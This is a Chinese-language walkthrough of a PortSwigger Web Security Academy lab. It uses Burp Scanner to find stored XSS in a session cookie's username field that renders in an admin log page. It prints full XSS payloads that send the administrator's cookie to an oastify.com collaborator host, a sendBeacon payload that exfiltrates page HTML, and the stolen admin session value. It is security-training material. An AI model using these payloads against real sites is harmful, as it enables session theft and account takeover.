# 实验室：扫描非标准数据结构

本实验室包含一个难以手动发现的漏洞，它位于一个非标准数据结构中。

要解决本实验室，请使用 Burp Scanner 的 **Scan selected insertion point** 功能识别漏洞，然后手动利用它并删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 使用登录功能
    ```http
    POST /login HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=%3a7rIAykwY57puzm8JLWhIMRIqQq0m2EZt
    ```

    - 响应
        ```http
        HTTP/2 302 Found
        Location: /my-account?id=wiener
        Set-Cookie: session=wiener%3acxtsjIITsr4cG6kVb3nYo14PQZN7Y87Z; Secure; SameSite=None
        ```

    - 分析 cookie
        - 登录前
            `:7rIAykwY57puzm8JLWhIMRIqQq0m2EZt`
        - 登录 cookie
            `wiener:cxtsjIITsr4cG6kVb3nYo14PQZN7Y87Z`
        - 登出后再次登录
            `wiener:sPbxcJKSOQRj0RkURUg44GH449P2om7R`

        - 格式
            `用户名:未知字符串`

- 修改 cookie
    ```http
    Cookie: session=carlos%3aVrhRQhh3J7uU3g9hTEdDOK0ttrZ8Ufly
    ```
    - 响应 500
        ```log
        Integrity violation detected
        ```
    - 用户名部分的修改导致服务器端异常

扫描
- 选中用户名字段并执行插入点的部分扫描，得到 XSS 日志
    ```log
    Issue detail

    The payload '"><svg/onload=fetch`//id\.oastify.com`> was submitted in the manual insertion point 1. This payload is designed to cause a web browser that renders it to make a request to an external domain. An HTTP request was made to that domain, indicating that the payload was rendered and executed within a web browser. The interaction occurred 83 milliseconds after the scan of the item was completed.
    ```

- 修改载荷的带外端点到协作服务器
    ```http
    GET /my-account HTTP/2
    Host: id.web-security-academy.net
    Cookie: session='%22%3e%3csvg%2fonload%3dfetch%60%2f%2fid%5c.oastify.com%60%3e%3aVrhRQhh3J7uU3g9hTEdDOK0ttrZ8Ufly
    ```

- 协作服务器收到 DNS 与 HTTP 请求
    ```http
    GET / HTTP/1.1
    Host: id.oastify.com
    Connection: keep-alive
    sec-ch-ua-platform: "Linux"
    User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
    sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
    sec-ch-ua-mobile: ?0
    Accept: */*
    Origin: https://id.web-security-academy.net
    Sec-Fetch-Site: cross-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://id.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-US,en;q=0.9
    ```

- 推测此处的场景为 cookie 反射到 log 中，当管理员查看 log 时执行 XSS 载荷

构造针对管理员的 XSS 攻击
- 简化 XSS 载荷格式
    ```http
    GET /my-account HTTP/2
    Host: id.web-security-academy.net
    Cookie: session='"><svg/onload="fetch('//id.oastify.com')">:VrhRQhh3J7uU3g9hTEdDOK0ttrZ8Ufly
    ```
    - 成功收到带外请求


- 窃取 cookie
    ```http
    GET /my-account HTTP/2
    Host: id.web-security-academy.net
    Cookie: session='"><svg/onload="fetch('//id.oastify.com/cookie?'%2bdocument.cookie)">:VrhRQhh3J7uU3g9hTEdDOK0ttrZ8Ufly
    ```
    
    - 协作服务器请求
    ```http
    GET /cookie?session=administrator%3awFi9Q7dRxri42Pnq6lzqKYcSvtC4gqT1;%20secret=YNt0H4BJ9ld6ehPeUgCaH9mmR5A0gBLK;%20session=administrator%3awFi9Q7dRxri42Pnq6lzqKYcSvtC4gqT1 HTTP/1.1
    ```

- 使用管理员 cookie 访问账户页面
    - 成功以管理员账户登录，使用删除功能

额外探索
- 查看管理界面的 log 功能
    ```http
    GET /admin/logs HTTP/2
    Host: id.web-security-academy.net
    ```
    - 响应
        ```html
        <div>Integrity violation detected from '"><svg/onload="fetch('//id.oastify.com/cookie?'+'test')"></div>
        ```
        - 上下文为管理 log 的错误信息

- XSS 读取当前页面
    ```
    <svg/onload="navigator.sendBeacon('//id.oastify.com/data',new URLSearchParams([['data',document.body.outerHTML]]))">:VrhRQhh3J7uU3g9hTEdDOK0ttrZ8Ufly
    ```
    - 成功获取页面作为 POST 请求体
        ```html
        <section class="top-links">
            <a href="/">Home</a>
            <p>|</p>
            <a href="/admin">Admin panel</a>
            <p>|</p>
            <a href="/my-account?id=administrator">My account</a>
            <p>|</p>
        </section>
        ```
    - 此时的另一种思路：使用 XSS 带外逐渐获取管理端点信息，最后在管理员浏览器 XSS 执行删除功能
